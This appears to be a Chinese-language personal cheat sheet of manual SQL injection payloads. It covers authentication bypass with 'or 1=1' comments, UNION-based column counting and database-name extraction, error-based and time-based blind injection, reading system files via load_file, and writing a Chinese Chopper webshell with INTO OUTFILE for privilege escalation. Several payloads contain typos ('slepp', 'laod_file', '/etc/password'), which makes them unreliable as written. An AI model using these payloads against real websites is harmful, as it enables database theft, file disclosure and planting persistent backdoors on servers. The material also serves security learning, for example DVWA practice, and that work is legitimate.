## 手工注入

有的时候自动化会被禁止使用，比如一些删除和插入，会导致数据库被破坏。

### 大佬文章推荐

[肖洋肖恩、](https://www.cnblogs.com/-mo-/p/12730682.html)

## 常用的 playload

### 注释

```sql
or 1=1--+
'or 1=1--+
"or 1=1--+
)or 1=1--+
')or 1=1--+
") or 1=1--+
"))or 1=1--+
--+ 可以用#替换，url 提交过程中 Url 编码后的#为%23
--+ SELECT * FROM users WHERE id=''or 1=1--+' LIMIT 0,1
```

### 联合注入

判断字段数目,`?id=1' order by 1 --+ `此时页面正常，
继续换更大的数字测试`?id=1' order by 10 --+` 此时页面返回错误，
更换小的数字测试`?id=1' order by 5 --+ `此时页面依然报错，
继续缩小数值测试`?id=1' order by 3 --+ `此时页面返回正常，
更换大的数字测试`?id=1' order by 4 --+` 此时页面返回错误，3 正常，4 错误，说明字段数目就是 3

```sql
?id=1' order by 4--+
```

拿到数据库名

```sql
?id=0' union select 1,2,3,database()--+
```

### 报错爆出信息

通过 id=-1 一个负数不存在的 id 值来触发报错

```sql
id=-1' UNION SELECT 1,2,3
```

通过 or 1=1 语句来触发报错

```sql
id=1' or 1=1 UNION SELECT 1,2,3
```

### 基于时间的盲注

```sql
1' and slepp(5) --'
--+ select first_name, last_name from dvwa.users where user_id='1' and sleep(5) --'
```

### 读取文件

```sql
=1' and 1=2 union select laod_file('/etc/password') #
```

### 文件写入

文件写入配合菜刀提权。

```sql
=1 and 1=2 union select '菜刀木马内容' into outfile '文件目录+文件名'
```
